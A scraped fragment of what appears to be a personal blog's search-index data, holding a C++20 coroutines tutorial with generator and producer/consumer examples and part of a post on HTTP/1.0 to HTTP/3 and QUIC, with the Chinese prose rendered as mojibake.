&lt;thread&gt;using namespace std;struct Task &#123; struct promise_type; using handle_type = std::coroutine_handle&lt;promise_type&gt;; handle_type h; // åç¨‹çš„ handle std::future&lt;void&gt; fut; //================================================================================= // promise struct promise_type &#123; int result; coroutine_handle&lt;&gt; h_next = nullptr; // è°ƒåº¦çš„ä¸‹ä¸€ä¸ªåç¨‹ Task get_return_object() &#123; return Task&#123; handle_type::from_promise(*this) &#125;; &#125; suspend_always initial_suspend() &#123; return &#123;&#125;;&#125;; auto final_suspend() noexcept &#123; // è¢« await åï¼Œå¦‚æœ h_next ä¸ä¸ºç©ºï¼Œåˆ™è¿”å› h_next(è°ƒåº¦åˆ°æŒ‡å®šåç¨‹)ï¼Œå¦åˆ™è¿”å› std::noop_coroutine() (è°ƒåº¦åˆ°åç¨‹çš„è°ƒç”¨è€…) struct next_awaiter &#123; // as a promise promise_type* self; bool await_ready() noexcept &#123; return false; &#125; // will suspend void await_resume() noexcept &#123;&#125;; coroutine_handle&lt;&gt; await_suspend(coroutine_handle&lt;promise_type&gt; hdl) noexcept &#123; if (hdl.promise().h_next) &#123; return hdl.promise().h_next; // è¿”å› h_next ï¼Œå³è°ƒåº¦çš„åˆ°ä¸‹ä¸€ä¸ªåç¨‹ &#125; else &#123; return std::noop_coroutine(); &#125; &#125; &#125;; return next_awaiter&#123; this &#125;; &#125; // called at co_return void return_value(int i) &#123; result = i; &#125; void unhandled_exception() &#123;&#125; &#125;; //================================================================================= // awaiter definition bool await_ready() &#123; return false; &#125; // go to await_suspend // co_await will call await_suspend void await_suspend(handle_type hdl) &#123; h.promise().h_next = hdl; // è®¾ç½®ä¸‹ä¸€ä¸ªåç¨‹(consume) // å¦å¼€çº¿ç¨‹æ‰§è¡Œ producer åç¨‹ resume() , æ­¤æ—¶å¼‚æ­¥åœ°å¼€å§‹æ‰§è¡Œ produce() å‡½æ•° fut = std::async([this]() &#123; h.resume(); &#125;); &#125; int await_resume() &#123; return h.promise().result; &#125;&#125;;// åç¨‹ producerTask produce() &#123; // producer åç¨‹ resume() ï¼Œä»è¿™é‡Œå¼€å§‹æ‰§è¡Œ int val = 1111; std::this_thread::sleep_for(std::chrono::milliseconds(500)); cout &lt;&lt; std::this_thread::get_id() &lt;&lt; \" produce: \" &lt;&lt; val &lt;&lt; endl; co_return val; // promise::return_value(int) // final_suspend è¿”å› consumer çš„ coroutine_handleï¼Œå³è°ƒåº¦åˆ° consumer åç¨‹ // æ³¨æ„ï¼Œæ­¤æ—¶ producer åç¨‹è¿˜å­˜åœ¨ï¼ŒåŒæ—¶ï¼Œå½“å‰è¿è¡Œåœ¨ async çº¿ç¨‹ä¸­&#125;// åç¨‹ consumerTask consume(Task&amp; fut) &#123; cout &lt;&lt; std::this_thread::get_id() &lt;&lt; \" consume: waiting \" &lt;&lt; endl; // è¿™é‡Œçš„ co_await çš„æ˜¯ producer (fut) ï¼Œä¼ å…¥ producer::await_suspend çš„æ˜¯ consumer çš„ coroutine_handle // ä» producer::await_suspend å¼€å§‹æ‰§è¡Œ int val = co_await fut; // ä» producer::final_suspend æ‰§è¡Œç»“æŸåï¼Œè°ƒåº¦åˆ° consumer åç¨‹ï¼Œä»æ­¤å¤„å¼€å§‹æ‰§è¡Œ // åœ¨æ­¤ä¹‹å‰ï¼Œç”± producer::await_resume è¿”å›çš„ç»“æœï¼Œä¿å­˜åˆ° val // ï¼ï¼ï¼æ³¨æ„ï¼Œæ­¤æ—¶ consumer åç¨‹è¿è¡Œåœ¨ async çº¿ç¨‹ä¸­ cout &lt;&lt; std::this_thread::get_id() &lt;&lt; \" consume: \" &lt;&lt; val &lt;&lt; endl; co_return 0; // promise::return_value(int) // åç¨‹ç»“æŸæ‰§è¡Œï¼Œå³ async çº¿ç¨‹ç»“æŸ&#125;int main() &#123; // åˆå§‹åŒ–åç¨‹ auto prod = produce(); auto cons = consume(prod); // consumer åç¨‹ ï¼Œä» co_await å¼€å§‹æ‰§è¡Œ cons.h.resume(); // ç­‰å¾…åç¨‹ consumer åç¨‹æ‰§è¡Œå®Œæ¯•ï¼Œä½†æ˜¯å½“å‰ç¨‹åºä¸ä¼šé˜»å¡ï¼Œè€Œæ˜¯å¿™ç­‰å¾… while (!cons.h.done()) &#123; cout &lt;&lt; std::this_thread::get_id() &lt;&lt; \" main: waiting \" &lt;&lt; endl; std::this_thread::sleep_for(std::chrono::milliseconds(100)); &#125; cout &lt;&lt; std::this_thread::get_id() &lt;&lt; \" main: done\" &lt;&lt; endl; return 0; // ä¸»çº¿ç¨‹ç»“æŸï¼Œåç¨‹ææ„&#125; co_await ä½œä¸ºä¸€ä¸ªä¸€å…ƒæ“ä½œç¬¦ï¼Œæš‚åœåç¨‹å¹¶å°†æ§åˆ¶æƒè¿”å›ç»™è°ƒç”¨æ–¹ã€‚ å°†æ“ä½œå¯¹è±¡è½¬åŒ–ä¸ºå¯ç­‰å¾…ä½“ awaitable å¯¹è±¡ è°ƒç”¨ awaiter.await_ready() è¿”å› false æš‚åœåç¨‹ï¼Œæ­¤æ—¶åç¨‹å·²ç»å®Œå…¨æš‚åœï¼Œå¯ä»¥åœ¨ä¸åŒçº¿ç¨‹é—´è½¬ç§»åç¨‹å¥æŸ„ï¼Œè€Œä¸”ä¸éœ€è¦é¢å¤–åŒæ­¥å¤„ç†ã€‚ è°ƒç”¨ awaiter.await_suspend(handle) ï¼Œå…¶ä¸­ handle è¡¨ç¤ºå½“å‰åç¨‹çš„åç¨‹å¥æŸ„ï¼š await_suspend è¿”å› void ï¼Œé‚£ä¹ˆå°†æ§åˆ¶æƒè¿”å›ç»™åç¨‹çš„è°ƒç”¨æ–¹ï¼Œè€Œæš‚åœå½“å‰åç¨‹ã€‚ await_suspend è¿”å› trueï¼Œä¹Ÿå°†æ§åˆ¶æƒè¿”å›ç»™è°ƒç”¨æ–¹ï¼›è¿”å› false ï¼Œåˆ™ç»§ç»­æ‰§è¡Œå½“å‰åç¨‹ã€‚ await_suspend è¿”å› å…¶ä»–åç¨‹çš„å¥æŸ„ï¼Œé‚£ä¹ˆ handle.resume() æ¢å¤æ‰§è¡Œå…¶ä»–åç¨‹ï¼Œæœ€ç»ˆä¼šè¿”å›åˆ°å½“å‰åç¨‹ã€‚ await_suspend æŠ›å‡ºå¼‚å¸¸ï¼Œé‚£ä¹ˆä¼šå‘ä¸Šä¸€å±‚è°ƒç”¨è€…æŠ›å‡ºå¼‚å¸¸ã€‚ è¿”å› true ä¸ä¼šæš‚åœåç¨‹ è°ƒç”¨ awaiter.await_resume() ï¼Œå®ƒçš„è¿”å›ç»“æœå°±æ˜¯ co_await expr çš„è¿”å›ç»“æœã€‚ ç”±äºå¦‚æœæ‰§è¡Œåˆ° awaiter.await_suspendï¼Œé‚£ä¹ˆåç¨‹å·²ç»å®Œå…¨æš‚åœï¼Œå¯ä»¥åœ¨ä¸åŒçº¿ç¨‹é—´è½¬ç§»åç¨‹å¥æŸ„ï¼Œè€Œä¸”ä¸éœ€è¦é¢å¤–åŒæ­¥å¤„ç†ã€‚æ¯”å¦‚ï¼Œå°†åç¨‹å¥æŸ„å†™å…¥å›è°ƒå‡½æ•°ï¼Œåœ¨æŸä¸ªå¼‚æ­¥ IO æ“ä½œå®Œæˆæ—¶è¿è¡Œè¯¥åç¨‹ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;coroutine&gt;#include &lt;iostream&gt;#include &lt;stdexcept&gt;#include &lt;thread&gt;auto switch_to_new_thread(std::jthread&amp; out) &#123; struct awaitable &#123; std::jthread* p_out; bool await_ready() &#123; return false; &#125; void await_suspend(std::coroutine_handle&lt;&gt; h) &#123; std::jthread&amp; out = *p_out; if (out.joinable()) &#123; throw std::runtime_error(\"thread already started, needed to be null, then generated by internal suspend\"); &#125; out = std::jthread([h] &#123;h.resume();&#125;); std::cout &lt;&lt; \"New thread \" &lt;&lt; out.get_id() &lt;&lt; \" started\\n\"; &#125; void await_resume() &#123;&#125; &#125;; return awaitable&#123;&amp;out&#125;;&#125;struct task &#123; struct promise_type &#123; task get_return_object() &#123; return &#123;&#125;; &#125; std::suspend_never initial_suspend() &#123; return &#123;&#125;; &#125; std::suspend_never final_suspend() noexcept &#123; return &#123;&#125;; &#125; void return_void() &#123;&#125; void unhandled_exception() &#123;&#125; &#125;;&#125;;task resuming_on_new_thread(std::jthread&amp; out) &#123; std::cout &lt;&lt; \"coroutine start, current thread \" &lt;&lt; std::this_thread::get_id() &lt;&lt; std::endl; co_await switch_to_new_thread(out); std::cout &lt;&lt; \"coroutine end, current thread \" &lt;&lt; std::this_thread::get_id() &lt;&lt; std::endl;&#125;int main() &#123; std::jthread out; resuming_on_new_thread(out); return 0;&#125; std::suspend_always åŠ std::suspend_never å°±æ˜¯æ ‡å‡†åº“æä¾›çš„ä¸¤ä¸ª awaitable å¯¹è±¡ã€‚ co_yield yield è¡¨è¾¾å¼å‘è°ƒç”¨æ–¹è¿”å›ä¸€ä¸ªå€¼å¹¶æš‚åœå½“å‰åç¨‹ï¼Œåœ¨ç”Ÿæˆå™¨å‡½æ•°ä¸­å¾ˆå¸¸è§ã€‚ 123456co_yield expr// æˆ–è€…co_yield &#123;initializer list&#125;// ç­‰ä»·äºco_await promise.yield_value(expr) yield_value ç”Ÿæˆå™¨å°†å®å‚ä¿å­˜åˆ°ç”Ÿæˆå™¨å¯¹è±¡ä¸­ï¼Œå¹¶è¿”å› suspend_always ï¼Œå¹¶å°†æ§åˆ¶æƒäº¤è¿˜ç»™è°ƒç”¨æ–¹ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;coroutine&gt;#include &lt;exception&gt;#include &lt;iostream&gt;#include &lt;memory&gt;template &lt;typename T&gt;struct Generator &#123; // å®šä¹‰ä¸€ä¸ª promise_type ç±»å‹ï¼Œç”¨äºç”Ÿæˆ handle_type struct promise_type; using handle_type = std::coroutine_handle&lt;promise_type&gt;; struct promise_type &#123; T value; // åœ¨ promise ä¸­æš‚å­˜äº†å€¼ std::exception_ptr exception; Generator get_return_object() &#123; return Generator(handle_type::from_promise(*this)); &#125; std::suspend_always initial_suspend() &#123; return &#123;&#125;; &#125; std::suspend_always final_suspend() noexcept &#123; return &#123;&#125;; &#125; void unhandled_exception() &#123; exception = std::current_exception(); &#125; template &lt;std::convertible_to&lt;T&gt; From&gt; std::suspend_always yield_value(From&amp;&amp; from) &#123; value = std::forward&lt;From&gt;(from); return &#123;&#125;; &#125; void return_void() &#123;&#125; &#125;; // æ„é€ å‡½æ•°ä¼ å…¥ handle_typeï¼Œç”¨äºç”Ÿæˆ Generator å¯¹è±¡ handle_type h; Generator(handle_type hdl) : h(hdl) &#123;&#125; ~Generator() &#123; h.destroy(); &#125; explicit operator bool() &#123; fill(); // è°ƒç”¨ fill() æ–¹æ³•ï¼Œå¡«å…… promise ä¸­çš„å€¼å’Œå¼‚å¸¸å¯¹è±¡ï¼›å¦‚æœè¿‡æ²¡æœ‰ä½¿ç”¨ operator()ï¼Œåˆ™ä¸ä¼šé‡å¤æ‰§è¡Œåç¨‹ return !h.done(); &#125; T operator()() &#123; fill(); m_full = false; return std::move(h.promise().value); // è¿”å› promise ä¸­æš‚å­˜çš„å€¼ &#125;private: bool m_full = false; void fill() &#123; if (!m_full) &#123; h(); // è°ƒç”¨ handle_type::operator()ï¼Œè§¦å‘åç¨‹æ‰§è¡Œ // handle ä¸­å­˜å‚¨çš„ promise å¯¹è±¡ï¼Œæš‚å­˜äº†å½“å‰çš„ç›®æ ‡å˜é‡å€¼æ‹·è´å’Œç¨‹åºå¼‚å¸¸å¯¹è±¡ if (h.promise().exception) &#123; std::rethrow_exception(h.promise().exception); &#125; m_full = true; &#125; &#125;&#125;;Generator&lt;uint64_t&gt;fibonacci_sequence(unsigned n) &#123; if (n == 0) &#123; co_return ; &#125; if (n &gt; 94) &#123; throw std::runtime_error(\"n too large, number will overflow\"); &#125; co_yield 0; if (n == 1) &#123; co_return; &#125; co_yield 1; if (n == 2) &#123; co_return; &#125; uint64_t a = 0; uint64_t b = 1; for (unsigned i = 2; i &lt; n; ++i) &#123; uint64_t s = a + b; co_yield s; a = b; b = s; &#125;&#125;int main() &#123; try &#123; auto gen = fibonacci_sequence(1); for (int j = 0; gen; ++j) &#123; std::cout &lt;&lt; \"fibonacci[\" &lt;&lt; j &lt;&lt; \"] = \" &lt;&lt; gen() &lt;&lt; '\\n'; &#125; &#125; catch (const std::exception&amp; e) &#123; std::cerr &lt;&lt; \"exception: \" &lt;&lt; e.what() &lt;&lt; '\\n'; &#125; catch (...) &#123; std::cerr &lt;&lt; \"unknown exception\\n\"; &#125; return 0;&#125; co_return co_return expr; ç›¸å½“äº p.return_value(expr); goto final_suspend; ã€‚ co_return; ç›¸å½“äº p.return_void(expr); goto final_suspend;ã€‚ coroutine_handle ç±»æ¨¡æ¿ coroutine_handle èƒ½ç”¨äºè¡¨ç¤ºï¼Œæš‚åœæˆ–æ‰§è¡Œä¸­çš„åç¨‹ã€‚ä½¿ç”¨æ—¶è¦æ³¨æ„é¿å… dangling é—®é¢˜ï¼Œå¯èƒ½ä¼šå¯¼è‡´ undefined behaviorã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111#include &lt;coroutine&gt;#include &lt;iostream&gt;#include &lt;optional&gt;template &lt;std::movable T&gt;class Generator &#123;public: //================================================================================= // promise_type struct promise_type &#123; std::optional&lt;T&gt; current_value; Generator&lt;T&gt; get_return_object() &#123; return Generator&#123;Handle::from_promise(*this)&#125;; &#125; static std::suspend_always initial_suspend() noexcept &#123; return &#123;&#125;; &#125; static std::suspend_always final_suspend() noexcept &#123; return &#123;&#125;; &#125; std::suspend_always yield_value(T value) noexcept &#123; current_value = std::move(value); return &#123;&#125;; &#125; void await_transform() = delete; [[noreturn]] void unhandled_exception() &#123; throw; &#125; &#125;; using Handle = std::coroutine_handle&lt;promise_type&gt;; explicit Generator(const Handle coroutine) : m_coroutine(coroutine) &#123;&#125; //================================================================================= // constructor Generator() = default; ~Generator() &#123; if (m_coroutine) &#123; m_coroutine.destroy(); &#125; &#125; Generator(const Generator&amp;) = delete; Generator&amp; operator=(const Generator&amp;) = delete; Generator(Generator&amp;&amp; other) : m_coroutine(other.m_coroutine) &#123; other.m_coroutine = &#123;&#125;; &#125; Generator&amp; operator=(Generator&amp;&amp; other) &#123; if (this != &amp;other) &#123; if (m_coroutine) &#123; m_coroutine.destroy(); &#125; m_coroutine = other.m_coroutine; other.m_coroutine = &#123;&#125;; &#125; return *this; &#125; //================================================================================= // for loop support class Iter &#123; public: void operator++() &#123; m_coroutine.resume(); &#125; const T&amp; operator*() &#123; return *m_coroutine.promise().current_value; &#125; // out of range bool operator==(std::default_sentinel_t) const &#123; return !m_coroutine || m_coroutine.done(); &#125; explicit Iter(const Handle coroutine) : m_coroutine(coroutine) &#123;&#125; private: Handle m_coroutine; &#125;; Iter begin() &#123; if (m_coroutine) &#123; m_coroutine.resume(); &#125; return Iter&#123;m_coroutine&#125;; &#125; std::default_sentinel_t end() &#123; return &#123;&#125;; &#125;private: Handle m_coroutine;&#125;;template &lt;std::integral T&gt;Generator&lt;T&gt; range(T first, T last) &#123; while (first &lt; last) &#123; co_yield first; first++; &#125;&#125;int main() &#123; for (const char i : range(65, 91)) &#123; std::cout &lt;&lt; i &lt;&lt; ' '; &#125; std::cout &lt;&lt; '\\n'; return 0;&#125; æ•°æ®æˆå‘˜ ptr : void* ï¼ŒæŒ‡å‘åç¨‹çŠ¶æ€çš„æŒ‡é’ˆï¼› æˆå‘˜å‡½æ•° æ„é€ å‡½æ•° operator= æ‹·è´èµ‹å€¼ operator coroutine_handle&lt;&gt; è·å¾—ç±»å‹æ“¦é™¤çš„ coroutine_handle ï¼Œå°±æ˜¯è¯´å°†ä¸åŒç±»å‹çš„æ¨¡ç‰ˆï¼Œè¿”å›ç»Ÿä¸€çš„ç±»å‹ done : æ£€æŸ¥åç¨‹æ˜¯å¦å®Œæˆ operator bool : æ£€æŸ¥å½“å‰ handle æ˜¯å¦è¡¨ç¤ºåç¨‹ operator() æˆ–è€… resume : æ¢å¤åç¨‹æ‰§è¡Œ destroy : é”€æ¯åç¨‹ promise : è®¿é—®åç¨‹çš„ promise å¯¹è±¡ from_promise : ä»ä¸€ä¸ª promise å¯¹è±¡ï¼Œåˆ›å»º coroutine_handle address : è¿”å›æ”¯æ’‘åç¨‹çš„åº•å±‚æŒ‡é’ˆ from_address : ä»æŒ‡é’ˆåœ°å€å¯¼å…¥åç¨‹ C++20 è¿˜ä¸º coroutine_handle æä¾›äº†æ•£åˆ—ç‰¹åŒ–æ”¯æŒï¼Œstd::hashã€‚ åº”ç”¨ åœ¨è®¾è®¡ç½‘ç»œåº”ç”¨æ—¶ï¼Œå¯ä»¥åœ¨éœ€è¦ç­‰å¾…IOè¾“å…¥æ—¶ï¼Œå°†åç¨‹ co_await äº¤è¿˜æ§åˆ¶æƒåˆ°åç¨‹çš„è°ƒç”¨è€…æˆ–è€…è°ƒåº¦åˆ°å…¶ä»–åç¨‹ã€‚å½“ epoll ä¸­æ¥æ•°æ®äº†ï¼Œè§¦å‘äº†IOäº‹ä»¶ï¼Œå†åœ¨ç›¸åº”çš„å›è°ƒå‡½æ•°ä¸­ resume åç¨‹çš„è°ƒç”¨ã€‚ IO å¤šè·¯å¤ç”¨ More to read My tutorial and take on C++20 coroutines (stanford.edu)","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Coroutine","slug":"Notes/Coroutine","permalink":"https://racleray.github.io/categories/Notes/Coroutine/"}],"tags":[{"name":"Multi-threading","slug":"Multi-threading","permalink":"https://racleray.github.io/tags/Multi-threading/"},{"name":"Coroutine","slug":"Coroutine","permalink":"https://racleray.github.io/tags/Coroutine/"}],"author":"HeRui"},{"title":"HTTP1.0åˆ°3.0æµ…æ","slug":"HTTP1-0åˆ°3-0æµ…æ","date":"2023-11-09T06:43:14.000Z","updated":"2024-01-09T10:21:38.146Z","comments":true,"path":"posts/3465c9da.html","link":"","permalink":"https://racleray.github.io/posts/3465c9da.html","excerpt":"HTTP æŠ€æœ¯è¿­ä»£æ¼”è¿›","text":"HTTP 1.0 æ¯ä¸ªå¯¹è±¡è¿æ¥æ—¶é—´ï¼š2 * RTT (Round Trip Time) + L/Rï¼Œå³TCPè¿æ¥å»ºç«‹æ—¶é—´ + HTTPä»è¯·æ±‚åˆ°å“åº”çš„å‰å‡ ä¸ªå­—èŠ‚è¿”å›çš„æ—¶é—´ + å¯¹è±¡æˆ–è€…æ–‡ä»¶ä¼ è¾“çš„æ—¶é—´ã€‚ åç»­å¤šä¸ªå¯¹è±¡ï¼Œé€šè¿‡å¯¹è±¡æ–‡ä»¶çš„å¹¶è¡Œè¿æ¥ï¼Œå®ç°åŒæ—¶å¤šä¸ªå¯¹è±¡ä¼ è¾“ã€‚ HTTP 1.1 TPC è¿æ¥æŒä¹…åŒ–ï¼Œå› æ­¤ï¼Œn ä¸ªå¯¹è±¡æ€»å…±ä¼ è¾“æ¶ˆè€—ï¼šRTT + n * (RTT + L/R) æ—¶é—´ã€‚ä¼˜åŒ–äº†éå¹¶è¡Œä¼ è¾“æ—¶ï¼ŒHTTP 1.0 çš„ n * (2 * RTT + L/R)ã€‚ æµæ°´çº¿ä¼˜åŒ–åï¼ŒæœåŠ¡å™¨è¿ç»­ä¸æ–­åœ°å‘é€ n ä¸ªå¯¹è±¡æ–‡ä»¶ï¼Œè€Œä¸éœ€è¦æ¯ä¸ªå¯¹è±¡å†æ¬¡è¯·æ±‚è¿æ¥ã€‚å³ï¼Œ2 * RTT + L/R + RTT + (n - 1) * L/R = 3 * RTT + n * L/Rã€‚ HTTP 1.1 çš„é—®é¢˜ æœåŠ¡å™¨æŒ‰åºå“åº”è¿™äº›è¯·æ±‚ã€‚å¦‚æœå…ˆå¤„ç†å¤§å¯¹è±¡ï¼Œé‚£ä¹ˆåç»­å¯¹è±¡ä¼šæ”¶åˆ°å½±å“ã€‚ æµæ°´çº¿ä¸­ï¼Œç”±äºæŒ‰é¡ºåºå¤„ç†ï¼Œå¦‚æœå‡ºç°é—®é¢˜ï¼Œé‚£ä¹ˆåç»­å¯¹è±¡æ–‡ä»¶ä¼ è¾“ä¼šå‡ºç°é—®é¢˜ã€‚ HTTP 2.0 æœåŠ¡ç«¯å¢åŠ äº†å‘å®¢æˆ·ç«¯å‘é€å¯¹è±¡çš„çµæ´»æ€§ï¼ˆRFC 7540ï¼‰ æ‰€ç”¨æ–¹æ³•ã€çŠ¶æ€ç ã€å¤§éƒ¨åˆ†å¤´éƒ¨å­—æ®µéƒ½å’Œ HTTP1.1 æ— å¼‚ è¢«è¯·æ±‚å¯¹è±¡ä¼ è¾“æ¬¡åºï¼Œä¼šåŸºäºå®¢æˆ·ç«¯æŒ‡å®šçš„ä¼˜å…ˆçº§ å°†å¯¹è±¡åˆ‡å‰²ä¸º frames ï¼Œè°ƒåº¦è¿™äº› frames çš„ä¼ è¾“æ¬¡åºï¼Œæ¥ç¼“è§£ä¼ è¾“çš„é˜»å¡é—®é¢˜ï¼ˆHOLï¼‰ï¼Œåœ¨å¤§å¯¹è±¡ä¼ è¾“å¸§æ—¶ï¼Œè°ƒåº¦å°å¯¹è±¡å¸§åŒæ—¶ä¼ è¾“ å¯ä»¥å…ˆå‘å®¢æˆ·ç«¯æ¨é€ä¸€äº›å¯èƒ½ä¼šéœ€è¦çš„å¯¹è±¡ï¼Œå³ä½¿è¿˜æœªè¯·æ±‚ æ”¯æŒäºŒè¿›åˆ¶ç¼–ç ï¼Œæ•ˆç‡æ›´é«˜ æ”¯æŒå¤´éƒ¨å‹ç¼©ï¼Œå‡å°‘ä¼ è¾“æ•°æ®é‡ HTTP 2.0 çš„æ”¹è¿›ç›®æ ‡å°±æ˜¯å‡å°‘è¯·æ±‚çš„å»¶æ—¶ã€‚ HTTP 2.0 çš„é—®é¢˜ HOL é˜»å¡é—®é¢˜ä»ç„¶å­˜åœ¨ï¼Œä»ç„¶åœ¨æ¢å¤ä¸¢å¤±çš„æ®µæ•°æ®æ—¶ï¼Œä»ç„¶ä¼šåœæ­¢åç»­å¯¹è±¡çš„ä¼ è¾“ å¯ç”¨é€šè¿‡å¹¶è¡Œè¿æ¥ï¼Œå¢åŠ æ€»ä½“ååé‡ï¼Œä½†æ˜¯å¢åŠ äº†æœåŠ¡å™¨è´Ÿæ‹… æ²¡æœ‰è§£å†³å®‰å…¨é—®é¢˜ ç»“åˆ TLSï¼Œä¼šå¢åŠ ä¸€ä¸ª RTT é€šä¿¡æ—¶é—´ï¼Œä½†æ˜¯ HOL é˜»å¡ä»ç„¶å­˜åœ¨ HTTP æ…¢å¯åŠ¨é—®é¢˜ åŸºäºä¸¢å¤±çš„æ‹¥å¡æ§åˆ¶ååæŠ–åŠ¨ è¦å®ç°å¯é ä¼ è¾“ï¼Œå…¶æ¢å¤æ—¶é—´è¾ƒé•¿ï¼Œæ•ˆç‡ä½ IP åœ°å€å˜åŒ–ï¼ŒTCP è¿æ¥æ— æ³•ç»´æŒï¼Œç§»åŠ¨æ€§æ”¯æŒä¸å¥½ TCP åºå·äºŒä¹‰æ€§ï¼Œåœ¨è®¡ç®— RTO (Retransmission Timeout) æ—¶ï¼Œå–ç›¸åŒåºå·åŒ…ä¸­çš„å“ªä¸€ä¸ªè¿›è¡Œè®¡ç®— é—®é¢˜çš„æ ¹æºåœ¨äº TCPã€‚ä¸€ä¸ªå¯¹ç­–æ˜¯åŸºäº UDP å®ç°æ–°çš„ä¼ è¾“åè®®ï¼Œæ¯”å¦‚ QUICã€‚ HTTP 3.0 å°†åº”ç”¨å±‚ HTTP 2.0 ä¸­ä¸€äº›å¥½çš„åŠŸèƒ½è½¬ç§»åˆ°ä¸€ä¸ªå•ç‹¬çš„å±‚ QUIC ä¸Šã€‚ å¤šè·¯å¤ç”¨ï¼ŒåŒæ—¶ä¼ è¾“å¤šä¸ªå¯¹è±¡ å¯¹è±¡åˆ†å¸§äº¤é”™ä¼ è¾“ ä½¿ç”¨ä¼˜å…ˆçº§å®šä¹‰ä¼ è¾“æ¬¡åº äºŒè¿›åˆ¶ä¼ è¾“ å¤´éƒ¨å‹ç¼© å°† TCP çš„éƒ¨åˆ†åŠŸèƒ½è½¬ç§»åˆ° QUICï¼š æµé‡æ§åˆ¶å’Œæ‹¥å¡æ§åˆ¶ åŸºäº UDP é‡æ–°é«˜æ•ˆå®ç° é¿å…TCP åºå·äºŒä¹‰æ€§é—®é¢˜ï¼ŒRTO è®¡ç®—é—®é¢˜ åŸºäº UDP å¯ä»¥å®ç°è¿æ¥è¿ç§»ï¼Œå› ä¸º UDP æ˜¯æ— è¿æ¥çš„ã€‚ å€ŸåŠ©æˆç†Ÿçš„ TLS 1.3 åè®®ï¼Œè¿›è¡Œæ¡æ‰‹è®¤è¯å’Œäº¤æ¢å¯†é’¥ï¼Œä½¿ç”¨ QUIC ä¼ è¾“æŠ¥æ–‡ã€‚ QUIC æ˜¯åœ¨åº”ç”¨å±‚ä¸­å®ç°ï¼Œä¾¿äºéƒ¨ç½²æ¨å¹¿ HTTP3.0 å®ç°ã€‚ QUIC åè®®ä¹‹ä¸Šçš„ HTTP 2.0ã€‚ QUIC è¿æ¥: C åˆ° S ä¸¤ç«¯èŠ‚ç‚¹é—´çš„ä¸€ä¸ªä¼šè¯ã€‚æ¯ä¸ªç«¯ç‚¹è‡ªå·±é€‰æ‹© connection idï¼Œç”¨å¯¹æ–¹çš„ connection id æ ‡è¯†ä¸€ä¸ªå¯¹ç«¯è¿æ¥ã€‚ æµï¼ˆstreamï¼‰: ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚å’Œå“åº”çš„å­—èŠ‚æµã€‚ä¸€ä¸ªè¿æ¥ä¸Šï¼Œæœ‰å¤šä¸ªå¯¹è±¡çš„è¯·æ±‚å’Œå“åº”ï¼Œæ¯ä¸ªå¯¹è±¡çš„è¯·æ±‚å’Œå“åº”åœ¨ä¸€ä¸ªæµä¸­ã€‚ stream id ç”± 62 ä½è¡¨ç¤ºï¼Œæœ€ä½ä¸¤ä½ä¸­ä¸€ä½è¡¨ç¤ºå•åŒå‘ï¼Œä¸€ä½æ ‡è¯†æµçš„å‘èµ·è€…ã€‚ ä¸€ä¸ªè¿æ¥ä¸Šï¼Œå¯ä»¥æœ‰å¤šä¸ªæµï¼Œå¯ä»¥æ˜¯å•å‘æˆ–è€…åŒå‘ã€‚ frame : æµä¸­æ•°æ®çš„å•ä½ï¼Œåˆ†ä¸ºæ•°æ®å¸§å’Œæ§åˆ¶å¸§ã€‚ åˆ†ç»„ : è¿ç»­ä¼ è¾“çš„æ•°æ®å•ä½ï¼ŒUDP æ•°æ®æŠ¥è½½è·ä¸­æœ‰è‹¥å¹²åˆ†ç»„ï¼Œåˆ†ç»„åŒ…å«äº†è‹¥å¹²å¸§ã€‚ å¿«é€Ÿæ¡æ‰‹ DH ç®—æ³•å®ç° 0 RTT è¿æ¥è¿ç§»å®ç° åŸºäº UDPï¼ŒOS å†…æ ¸ä¸ç»´æŠ¤å’Œå¯¹æ–¹é€šä¿¡çš„çŠ¶æ€ï¼ŒIP åœ°å€å…è®¸å˜åŒ– QUIC è¿æ¥åœ¨ç”¨æˆ·æ€ï¼Œä½¿ç”¨ CID (connection) ç»´æŠ¤å’Œå¯¹æ–¹çš„é€šä¿¡çŠ¶æ€ è¿æ¥åŒæ–¹å„è‡ªç»´æŠ¤ç€ï¼šCID &lt;=&gt; IP åœ°å€ + UDP ç«¯å£ï¼Œä¸¤è€…ä¹‹é—´çš„å¯¹åº”å…³ç³» å…è®¸ IP åœ°å€å˜åŒ–æˆ–è€… UDP ç«¯å£å˜åŒ–ï¼Œåªè¦ CID ä¸å˜ï¼Œé‚£ä¹ˆé€šä¿¡å…³ç³»ä»ç„¶ç»´æŒ æ‹¥å¡æ§åˆ¶å’Œæµé‡æ§åˆ¶ å¯æ’æ‹”çš„æ¨¡å—åŒ–æ‹¥å¡æ§åˆ¶ï¼šé»˜è®¤ä½¿ç”¨ New Reno å’Œ Cubic ç®—æ³• å¯ä»¥é‡‡ç”¨æ–°çš„æ‹¥å¡æ§åˆ¶ç®—æ³•ï¼šBBR ã€BBRv2 è¿™ç§ æµé‡æ§åˆ¶åˆ†ä¸ºï¼šè¿æ¥çº§åˆ«ï¼Œæµçº§åˆ« å¯é æ€§ä¼ è¾“ é«˜æ•ˆå®ç°å¯é æ€§ä¼ è¾“ ACK å¸§æ”¯æŒæœ€å¤š 256 ä¸ª SACK ï¼Œè€Œ TCP æœ€å¤šæ”¯æŒ 3 ä¸ªï¼Œå¯ä»¥ç²¾ç¡®æ ‡è®°æ¥æ”¶ç«¯å“ªäº›åˆ†ç»„æ”¶åˆ° èƒ½é¿å… 99% ä»¥ä¸Šçš„è¶…æ—¶é‡ä¼  å‘é€æ–¹å‡å°‘ç›²ç›®é‡ä¼  PN å•è°ƒé€’å¢ï¼Œè§£å†³äº†åºå·äºŒä¹‰æ€§é—®é¢˜ è§„å®š PN(Packet Number) å•è°ƒé€’å¢ã€‚é‡ä¼ åˆ†ç»„å…·æœ‰ä¸åŒçš„ PN ï¼Œä½†æ˜¯åˆ†ç»„å†…å¯èƒ½æ˜¯ä¹‹å‰ä¸¢å¤±çš„å¸§ï¼Œå…·å¤‡ç›¸åŒçš„å¸§å· RTO è®¡ç®—æ— äºŒä¹‰æ€§ è¶…æ—¶é‡ä¼  ACK 